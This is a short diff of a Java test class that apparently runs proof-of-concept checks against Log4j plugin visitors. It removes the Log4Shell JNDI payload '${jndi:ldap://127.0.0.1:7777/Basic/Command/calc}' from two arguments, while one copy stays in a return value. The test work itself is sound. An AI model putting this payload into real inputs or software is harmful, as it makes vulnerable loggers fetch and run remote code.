@@ -35,9 +35,9 @@ public class PluginPocsTests {
                 return "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}";
             }
         };
-        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
+        LogEvent logEvent = new MutableLogEvent(new StringBuilder(), null);
         visitor.setAnnotation(annotation);
 
-        visitor.visit(configuration, node, logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
+        visitor.visit(configuration, node, logEvent, new StringBuilder());
     }
 }
